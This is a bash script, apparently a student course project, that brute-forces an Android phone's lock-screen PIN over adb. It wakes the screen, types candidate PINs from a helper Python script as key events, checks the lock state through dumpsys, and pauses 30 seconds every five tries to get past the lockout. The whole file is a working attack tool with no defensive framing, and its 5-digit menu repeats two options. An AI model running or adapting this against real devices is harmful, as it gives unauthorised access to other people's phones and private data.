#!/usr/bin/env bash
clear
exec 2> errors.log
export PATH="$PATH:C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2544.0_x64__qbz5n2kfra8p0"

echo -e "\e[96;5m       .__                 .__                 __              .___
  ____|  |_   ___________|  |   ____   ____ |  | __ ____   __| _/
 /  __/  |  \_/ __ \  __ \  |  /  _ \_/ ___\|  |/ // __ \ / __ | 
 \___ \|   Y  \  ___/|  | \/  |_(  <_> )  \___|    <\  ___// /_/ | 
/____  >__|  /\__  >_|  |____/\____/ \__  >_| \\___  >____ | 
     \/     \/     \/                       \/     \/    \/     \/ \e[0m"                                                                        
echo -e "                                               DSA Project"
echo -e "                                               Instructor: Ms. Maria Samad"
echo -e "                                               Team members: Sajal Fatima"
echo -e "                                                             Syeda Alishba Zaidi"
echo -e "                                                             Huzaifa Ahmed Khan" 
# Check if device is connected
while ! adb devices | findstr -q "device$"; do
    echo "Please connect your device..."
    sleep 1
done

# Device connected, continue with script
echo "Device connected!"
echo -e "\e[34m How long is your pin? 3/4/5 : \e[0m"
read digits
echo -e "\e[33m"
echo -e "\e[33m :::::::::::::::::::"
echo -e "\e[91m\e[1m\e[5m PIN BRUTER STARTED \e[0m"
echo -e "\e[33m :::::::::::::::::::"

# menu options
case $digits in
    3)
        echo "ENTER A CHOICE"
        echo "1) 000-099"
        echo "2) 100-199"
        echo "3) 200-299"
        echo "4) 300-399"
	  echo "5) 400-499"
	  echo "6) 500-599"
	  echo "7) 600-699"
	  echo "8) 700-799"
	  echo "9) 800-899"
	  echo "10) 900-999"
		
        ;;
    4)
        echo "ENTER A CHOICE"
        echo "1) 0000-0999"
        echo "2) 1000-1999"
        echo "3) 2000-2999"
        echo "4) 3000-3999"
	  echo "5) 4000-4999"
	  echo "6) 5000-5999"
	  echo "7) 6000-6999"
	  echo "8) 7000-7999"
	  echo "9) 8000-8999"
	  echo "10) 9000-9999"
        ;;
    5)
        echo "ENTER A CHOICE"
        echo "1) 00000-09999"
        echo "2) 10000-19999"
        echo "3) 20000-29999"
        echo "4) 30000-39999"
        echo "5) 40000-49999"
        echo "4) 30000-39999"
	  echo "5) 40000-49999"
	  echo "6) 50000-59999"
	  echo "7) 60000-69999"
	  echo "8) 70000-79999"
	  echo "9) 80000-89999"
	  echo "10) 90000-99999"
        ;;
    *)
        echo "Invalid input"
        exit 1
        ;;
esac
read choice

adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
echo -e "\e[33m"
echo -e "\e[33m ::::::::::::::::::::"
echo -e "\e[32m BRUTE FORCE STARTED"
echo -e "\e[33m ::::::::::::::::::::"
echo -e "\e[33m"
k=-1
output=$(python "C:\Users\Student\Downloads\dsa\main.py" "$digits" "$choice")
while read -r line; do
    clear    
	((k++))
    echo -e "\e[96;5m       .__                 .__                 __              .___
  ____|  |_   ___________|  |   ____   ____ |  | __ ____   __| _/
 /  __/  |  \_/ __ \  __ \  |  /  _ \_/ ___\|  |/ // __ \ / __ | 
 \___ \|   Y  \  ___/|  | \/  |_(  <_> )  \___|    <\  ___// /_/ | 
/____  >__|  /\__  >_|  |____/\____/ \__  >_| \\___  >____ | 
     \/     \/     \/                       \/     \/    \/     \/ \e[0m"
    echo -e "\e[33m"
    echo -e "\e[33m :::::::::::::::::::::::::::"
    echo -e "\e[33m :::::::::::::::::::::::::::"
    echo -e "\e[33m"
    echo -e "\e[1m ::::::::::::::::::::::"
    echo -e "\e[91m\e[1m\e[5m BRUTEFORCING WITH  $line \e[0m"
    echo -e "\e[1m ::::::::::::::::::::::"
	
    for (( j=0; j<${#line}; j++ )); do
    	adb shell input keyevent $((`echo ${line:$j:1}`+7))
    done
sleep 1
status=$(adb shell dumpsys window | findstr mDreamingLockscreen)

	if [[ $status != "mShowingDream=false mDreamingLockscreen=true" ]]; then
  		echo "The correct pin is $line"
		break
	fi

    adb shell input keyevent 66    
if ! (( `expr $k + 1` % 5 )); then
        adb shell input keyevent 66
        echo -e "\e[33m"
        echo -e "\e[32mSLEEPING FOR 30 SEC"
        echo -e "\e[33m"
        sleep 30
        adb shell input keyevent 82
        adb shell input swipe 407 1211 378 85
    fi

done <<< "$output"
read -p "Press any key to exit..." -n 1 -r
clear
echo -e "\e[96;5m       .__                 .__                 __              .___
  ____|  |_   ___________|  |   ____   ____ |  | __ ____   __| _/
 /  __/  |  \_/ __ \  __ \  |  /  _ \_/ ___\|  |/ // __ \ / __ | 
 \___ \|   Y  \  ___/|  | \/  |_(  <_> )  \___|    <\  ___// /_/ | 
/____  >__|  /\__  >_|  |____/\____/ \__  >_| \\___  >____ | 
     \/     \/     \/                       \/     \/    \/     \/ \e[0m"                                                                        
echo -e "                                               DSA Project"
echo -e "                                               Instructor: Ms. Maria Samad"
echo -e "                                               Team members: Sajal Fatima"
echo -e "                                                             Syeda Alishba Zaidi"
echo -e "                                                             Huzaifa Ahmed Khan" 
echo -e "\e[5m[*] CHOOSE CORRECT OPTION!!!!![*]\e[25m"
echo -e "\e[33m"
echo -e "\e[33m"
